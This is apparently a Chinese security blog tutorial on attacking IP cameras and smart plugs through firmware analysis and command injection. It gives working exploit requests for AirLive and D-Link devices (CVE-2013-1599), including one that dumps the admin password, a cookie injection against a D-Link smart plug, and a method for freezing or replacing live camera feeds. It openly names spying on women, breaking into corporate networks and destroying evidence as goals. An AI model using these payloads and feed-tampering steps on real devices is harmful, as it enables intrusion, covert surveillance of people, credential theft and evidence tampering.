# Hacking ipcam like Harold in POI

List
====

* * *

**0x00 针对ipcam的攻击目和前期准备**

**0x01 对于嵌入式设备参数注入漏洞的常规武器和分析方法**

**0x02 几个精彩的case**

**0x03 Hacking like POI**

0x00 前期准备
=========

* * *

本次我们讨论的是分析智能摄像头固件,通过参数注入的方式达到远程命令注入或代码执行的目的,此外,还将思考如何像一个电影黑客一样篡改画面,通过摄像头潜入内网

### 我能做什么

控制摄像头,监(tou)视(kui)女神

通过摄像头为边界入口,进入企业内网

篡改摄像头实时画面,销毁证据

### Target

#### 网络摄像头(`IPCam`)

由视频服务器和摄像头的集成,通常是`linux系统`,内置一个`web server`,画面实时传输,一般没有视频存储功能(本次重点介绍的攻击对象)

#### 数字视频录像机(`DVR/NVR`)

进行图像存储处理,可录像,录音,远程监控等等,大概分为PC式和嵌入式,操作系统不固定,只要处理设备装有处理软件即可,有视频存储功能(可回放)

#### 中央闭路电视(`CCTV`)

中央电视台?(大雾!)图像通信系统,和`DVR/NVR`结合起来,通过双绞线(搞不动),光缆(搞不动),网络(可以搞!)接收图像信号,监控室里常见～

#### 监控云平台

通过云平台集中管理多个设备(web狗表示轻松搞)

#### 引申的其他智能设备

智能路由器/智能插座...

### Method

1)通常分析,选择目标设备的固件,通过`binwalk`,`Firmware-Mod-Kit`,`foremost`提取分离固件

2)而逆向,代码调试还需要用到`IDA`(`ARM or MIPS`),用`QEMU`来进行仿真

3)也可以直接购买设备通过拆卸的方式进行,在设备主板的`JTAG`接口直接提取闪存,存放着系统信息,相当于硬盘,有多个分区,通常是`bootloader`(初始化设备),`kernel`(系统内核),`Filesystem`(文件系统,有我们需要的`rootfs`等等),`NVRAM`(存放设备配置文件)

4)因为下载固件分析是不用花钱的,所以降低了攻击者的攻击成本

### 常规流程

**1)下载固件分析文件结构并提取**

```
binwalk -eM firmware.bin

binwalk firmware.bin --dd=类型:保存下来的扩展名

./extract-firmware.sh firmware.bin

```

![enter image description here](http://drops.javaweb.org/uploads/images/3c4bf4a7cdee43a4cd13ed4e92714968b3f255ff.jpg)

**2)解包/挂载/解压提取的文件,确定`web`脚本,配置文件和二进制服务文件**

```
lzma -d xxx.lzma
./unsquashfs_all.sh xxx.squashfs

```

如果使用`fmk`通常不用手动解包，`fmk`解包后得到文件夹中`log`为`binwalklog`，`rootfs`为解包文件

![enter image description here](http://drops.javaweb.org/uploads/images/c732a4bbfb6d2cf49ec5cb80c3cb505b465b161e.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/51bae0f2196a42d8bec185c790f6fe42c781173d.jpg)

**3)开始分析文件(将elf载入ida逆向 or 对脚本文件白盒审计)**因为有`web`应用所以`web`方向的攻击技巧都可以轮一遍

因为`firmware`拿C写的,所以有机会存在`BOF`

![enter image description here](http://drops.javaweb.org/uploads/images/4e87eb02cd12bb1852c47cf3e9eeded8775aff95.jpg)

**4)调试验证漏洞**通过`QEMU`虚拟设备,或者直接在真实设备上测试

![enter image description here](http://drops.javaweb.org/uploads/images/c20186b69d8a6d71b08692de908ca6d2b4749ff3.jpg)

0x01 设备的参数注入
============

* * *

诚如我们所说,设备带有`web`,所以所有`web`存在的漏洞利用都可以尝试,其功能实现有可能是脚本文件(`php`,`asp`,`cgi?`)也有可能直接写死在bin里,每次参数传递直接通过二进制文件交给`server`处理

然而不管是哪种处理方式,都离不开`http`请求,如果在审计过程中发现了参数注入的问题,即可远程利用执行

**常见的危险函数：popen，system，exec...**寻找通过危险函数方法处理的变量，跟踪变量找到可控点，判断数据传入处理，构造`payload`，`exploit`

![enter image description here](http://drops.javaweb.org/uploads/images/58b489821f30d1499f4d5862b9ee3fca21a18b7e.jpg)

```
curl -d "user=3sadmin&password=27988303" http://*.*.*.*/records.cgi?action=remove&storage=sd&filename=test`commands`

```

当然,如果设备处理请求通过脚本处理也是一样的,分析方法参考常见的审计方法

![enter image description here](http://drops.javaweb.org/uploads/images/bf6af3a29fd855423e69fbdd3f10a74b75221f31.jpg)

### 怎么稳准狠抓到漏洞

1)因为我们讨论的是参数注入导致的命令执行或者代码执行,所以我们关注的应该是功能实现需要调用到系统命令的功能,比如`reboot`,`searchmac`,`delete`,`record`之类等功能性文件

2)灵活使用`hexdump`

3)机智利用`strings`来快速定位漏洞可能存在的文件

```
strings * -n 5|grep "popen"

```

### 利用参数污染绕过简单防御

因为厂商认为设备是个黑盒子,所以安全实现非常糙,通常对数据传入没有防御过滤,即便有的情况也可以通过技巧绕过,参数污染就是一种

```
/vul.cgi?a=whoami&a=test

```

**php中获取的是最后一个参数**

**cgi中获取的是第一个参数**

**asp中获取的是所有参数**

0x02 case
=========

* * *

### AirLive Command Injection

其中`cgi_test.cgi`可以为授权访问,在处理`write_mac`,`write_pid`,`write_msn`,`write_tan`,`write_hdv`的时候会造成命令注入

```
sub_93F4
STMFD           SP!, {R4-R7,LR}
LDR                 R0, =aQuery_string ; "QUERY_STRING"
SUB                 SP, SP, #4
BL                    getenv

```

使用`QUERY_STRING`获取`?`后面的值作为参数,传参之后会调用`info_writer`这个文件,最终调用`system()`执行

```
MOV             R2, R5
LDR             R1, =aOptIpncInfo__1 ; "/opt/ipnc/info_writer -p %s > /dev/null"
MOV             R0, SP
BL              sprintf
MOV             R0, SP
BL              system
MOV             R2, R5
LDR             R1, =aWrite_pidOkPid ; "WRITE_PID OK, PID=%s\r\n"
LDR             R0, =unk_1977C
MOV             R4, SP
BL              sprintf
B               loc_9728

```

### AirLive Command Injection Pwned

所以我们完全可以在传入几个受影响的参数后注入;或者&&的方式来注入我们的恶意命令

```
/cgi_test.cgi?write_pid&;id&
/cgi_test.cgi?write_pid&&&id&

```

![enter image description here](http://drops.javaweb.org/uploads/images/4269599ee7417794a0ef2301f823ce3c60deee5d.jpg)

### D-link Command Injection(CVE-2013-1599)

这是个影响很大的洞,至今依旧影响很多基于D-link固件二次开发的摄像头(尤其国内厂商)

在`/var/www/cgi-bin/`中,`rtpd.cgi`文件成为了猪队友

```
echo "$QUERY_STRING" | grep -vq ' ' || die "query string cannot contain spaces."
. $conf > /dev/null 2> /dev/null
eval "$(echo $QUERY_STRING | sed -e 's/&/ /g')"
case $action in
start)
$script start
;;
stop)
$script stop
;;
...

eval "$(echo $QUERY_STRING | sed -e 's/&/ /g')"

```

代码本意是要在?后传入action控制设备状态,奈何开发暴露智商，`$QUERY_STRING`取问号后的值将`&`替换后`eval`执行。。。？传值完全可控

### D-link Command Injection PWNed

```
/cgi-bin/rtpd.cgi?id
/cgi-bin/rtpd.cgi?echo&AdminPasswd_ss|tdb&get&HTTPAccount

```

![enter image description here](http://drops.javaweb.org/uploads/images/cdc697261694bd21bc3f86c43466293e99a11562.jpg)

### D-Link DSP-W110 Smart Plug

其实,掌握这个技能是可以衍生到其他大部分智能设备的,比如6月我发现的`dlink`智能插座漏洞(然而被捂烂)

漏洞成因比较简单,`http`请求中`cookie`的内容未经过任何处理,直接传递给了`sprintf()`调用并为了验证身份入库查询,因此形成了一个`sqli`,然而`sql`查询直接传给了`popen()`还造成了命令执行

`request.c`中将`cookie`字段完整的负值给了`hnap_cookie`,之后在`mod_hnap.c`被被`getHNAPCookie`函数处理直接被`sprintf()`拼接成了`sql`语句并直接查询,造成`sqli`

![enter image description here](http://drops.javaweb.org/uploads/images/c87a88bda6b93fafa615f222a31f1174090d4e08.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/0bf22d6c73a2c704a1ebf43bb005603f1e2df8f8.jpg)

### D-Link DSP-W110 Smart Plug PWNed

接下来,没有对任何数据进行处理直接把拼好的查询交给了`popen(WTF???)`造成命令执行

```
curl --cookie "terribleness='\`echo "ztz_162"\`" ip

```

![enter image description here](http://drops.javaweb.org/uploads/images/1d7cb8926d784dc089cc9dd7a3f67a0d222050f0.jpg)

可以看出,我们分析的三个命令执行漏洞,统一思路基本如下:

*   1)提取固件,拿到解包后的二进制文件或脚本文件
*   2)载入ida获取汇编代码或伪代码,定位危险函数,寻找可控变量
*   3)利用已有姿势(绕过简单防御)构造payload
*   4)一定要相信智能设备才起步,厂商做的盒子都非常糙,一定有逗比开发写逗比代码

0x03 Hacking like POI!
======================

* * *

美剧《疑犯追踪》中,大黑客Harold的`AI`主要就是通过`ipcam`进行分析,看上去酷炫的不要不要的,那么我们能不能达到`POI`中的一些篡改画面效果?yep

![enter image description here](http://drops.javaweb.org/uploads/images/474e1ff83ab6bd1eaf9c1c9ba0983ff3be44b053.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/2020ba3258606f656d042f365abb45604741845d.jpg)

(请忽略我拓扑图的水印,原图我找不到了)这里需要区分`ipcam`没有存储,所以视频传输都是实时的,而`DVR/NVR`有专门的存储设备,我们这里讨论的是`ipcam`的实时传输篡改

原理很简单,大部分`ipcam`实现传输画面通过两种方式,通过流,或镜头拍下图片后实时刷新图片反馈到画面

由此,我有了篡改的想法,`kill`传输流的进程使之画面冻结,或篡改镜头拍下的图片使之完成篡改

如果结合我们通过漏洞挖掘发现的命令注入,还能达到远程篡改的效果

然而,仔细思考会发现,这并不是一个最佳的`hacking`手法,如果`kill`进程冻结,对方刷新管理洁面后,进程重新启动,如果篡改图片,如何保证接下来镜头拍下的图片不覆盖我们的篡改图片

经过机智的我深思,如果我把正常传输进程抓包,模拟他的发包传输我自己的篡改图片,或者做一个类似`MITM`的中间人攻击,把正常进程发包图片替换,就可以完成完美篡改了！(此处应有掌声,应有现场演示,然而议题被取消了QAQ)

`Trendnet`的一款`ipcam`中,顺利达到了这个效果,通过分析知道`mjpg.cgi`控制视频流传输,利用之前所说`kill`进程使其画面冻结,成功篡改了画面(此处应该有演示,然而。。。)

![enter image description here](http://drops.javaweb.org/uploads/images/0d442d6d1809c19954234c4f280bc1113034731b.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/0198de0ffa82eda3c65e71f49b86226b22a911bd.jpg)

当然,如果设备是通过不断刷新图片的方式达到实时效果而不是`rtsp`这样的实时传输协议也可以通过我之前blog说过的利用发包强占

```
echo -ne “HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\n\r\n”
cat ztzsb.jpg

```

稍微机灵一点,我们可以结合命令执行的方式,再cgi脚本中加入执行我们的`bash`脚本然后远程利用

**总结一下,如何在挖掘过程中找到可利用的劫持方式**

> *   找到目标摄像头并确定其版本，型号，对固件进行下载分析
> *   利用之前该版本爆出过的漏洞或者自己对固件分析后得到的漏洞获取会话
> *   确定用于视频流传输的协议
> *   找到处理视频流的CGI
> *   分析脚本文件，找到脚本中的功能函数
> *   有些摄像头固件是没有动态脚本的，功能处理都写在`server`的`bin`中，所以还要分析`server`的`bin`文件

你看到的不是真的，**hack it！**

最后安利一个工具：**videojak**是一个很简单的`ipcam`的安全测试工具，它可以在你获取到的`ipcam`中做一个类似`MITM`的中间人攻击，直接劫持整个画面的传输流，或者重放上一个传输流

LAST
====

* * *

未来社会是IOT社会,智能设备的出现便利了生活,工作,也带来了各种安全隐患,本文中所涉及到的漏洞仍不属于主流利用的,更多的恶意利用是在公共网络空间中开放暴露的设备弱口令,默认口令,官方预留后门

去年的海康威视黑天鹅事件就给公众敲响警钟,今年4月我提及到的大华DVR37777端口开放的问题也在全国有很大影响,甚至Z-0ne早在3月就出了完整报告,然而都没有得到更多重视

WTF!